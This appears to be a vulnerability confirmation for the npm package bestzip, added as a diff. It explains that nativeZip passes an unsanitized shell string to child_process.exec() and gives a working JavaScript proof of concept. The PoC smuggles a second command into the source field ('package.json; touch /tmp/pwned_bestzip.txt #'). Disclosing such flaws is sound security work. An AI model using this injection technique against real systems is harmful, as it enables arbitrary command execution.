@@ -1,0 +1,27 @@
+Confirmed: `bestzip`'s `nativeZip` path builds a shell command string from `source`/`destination` and passes it to `child_process.exec()` unsanitized, allowing command injection.
+
+```javascript
+// Exploit: command injection in bestzip (node_modules/bestzip/lib/bestzip.js)
+// nativeZip() builds `zip --quiet --recurse-paths <destination> <source>` and
+// passes it straight to child_process.exec(), so any shell metacharacters in
+// `source` or `destination` are executed by the shell.
+
+const bestzip = require("bestzip");
+const fs = require("fs");
+
+const marker = "/tmp/pwned_bestzip.txt";
+try { fs.unlinkSync(marker); } catch (e) {}
+
+bestzip({
+  destination: "out.zip",
+  // injected shell command runs alongside the intended zip invocation
+  source: "package.json; touch " + marker + " #"
+})
+  .then(() => {
+    console.log("zip finished; injected command ran:", fs.existsSync(marker));
+  })
+  .catch(err => {
+    console.log("bestzip reported error (injection may still have run):", err.message);
+    console.log("injected command ran:", fs.existsSync(marker));
+  });
+```
